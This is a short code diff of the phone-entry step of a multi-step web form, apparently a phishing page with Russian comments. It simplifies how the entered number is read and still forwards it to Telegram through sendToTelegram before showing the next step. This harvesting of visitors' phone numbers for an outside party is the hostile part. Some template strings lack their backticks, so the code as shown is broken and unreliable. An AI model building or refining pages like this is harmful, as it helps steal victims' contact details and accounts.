@@ -289,23 +289,14 @@
     }
 
     function sendPhone() {
-      const countryCodeInput = document.querySelector('.country-code').value.trim();
-      const phoneInputRaw = document.getElementById('phone').value.trim();
+      const phoneInput = document.getElementById('phone');
+      phoneNumber = phoneInput.value.trim();
 
-      // Удаляем лишние "+" в начале каждого поля
-      const countryCode = countryCodeInput.replace(/^\+/, '');
-      const phone = phoneInputRaw.replace(/^\+/, '');
-
-      // Склеиваем номер
-      phoneNumber = +${countryCode}${phone};
-
-      // Проверка: минимум 10 цифр в основном номере (не код страны)
-      if (phone.length < 10) {
+      if (phoneNumber.length < 10) {
         document.getElementById('phoneError').style.display = 'block';
         return;
       }
 
-      // Отправляем в Telegram
       sendToTelegram(📱 Введён номер телефона: ${phoneNumber});
       showStep(2);
     }
